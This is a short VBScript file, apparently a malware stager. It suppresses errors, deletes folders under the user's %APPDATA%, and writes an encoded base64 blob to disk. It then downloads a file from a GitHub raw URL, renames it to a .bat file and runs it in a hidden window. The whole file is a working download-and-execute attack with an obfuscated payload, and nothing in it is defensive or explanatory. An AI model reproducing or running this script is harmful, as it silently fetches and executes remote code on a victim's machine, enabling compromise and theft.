
On Error Resume Next: Set fso=CreateObject("Scripting.FileSystemObject"):Set sh=CreateObject("WScript.Shell"):p=sh.ExpandEnvironmentStrings("%APPDATA%")&"\Paged"
If fso.FolderExists(p) Then fso.DeleteFolder p, True
On Error Resume Next: Set fso=CreateObject("Scripting.FileSystemObject"):Set sh=CreateObject("WScript.Shell"):p=sh.ExpandEnvironmentStrings("%APPDATA%")&"\Paged-l"
If fso.FolderExists(p) Then fso.DeleteFolder p, True
With CreateObject("Scripting.FileSystemObject")
    tempPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\Grok-l")
    If .FolderExists(tempPath) Then .DeleteFolder tempPath, True
End With

Set fileSys = CreateObject("Scripting.FileSystemObject")
Set shellObj = CreateObject("WScript.Shell")
userData = shellObj.ExpandEnvironmentStrings("%APPDATA%")
workDir = userData & "\Paged-l"

If Not fileSys.FolderExists(workDir) Then fileSys.CreateFolder(workDir)

Set fileOut1 = fileSys.CreateTextFile(workDir & "\l.txt", True)
fileOut1.WriteLine "BhsDHhxNQUAQBxsfGw1ZDQAaQQAHA1sYHgJDQRwWAx8bC0AFDxhYAw4eAEASAAwYCgoTQBsPGg=="
fileOut1.Close

Set fileOut2 = fileSys.CreateTextFile(workDir & "\m.txt", True)
Set httpObj = CreateObject("MSXML2.XMLHTTP")
httpObj.Open "GET", "https://raw.githubusercontent.com/Zenth-grid/ZENTH-MAIN/main/V/Main.txt", False
httpObj.Send
fileOut2.Write httpObj.responseText
fileOut2.Close

WScript.Sleep 5000
fileSys.MoveFile workDir & "\m.txt", workDir & "\m.bat"
WScript.Sleep 3000

If fileSys.FileExists(workDir & "\m.bat") Then
    shellObj.Run Chr(34) & workDir & "\m.bat" & Chr(34), 0, False
Else
    WScript.Echo "Error: m.bat not found in " & workDir
End If
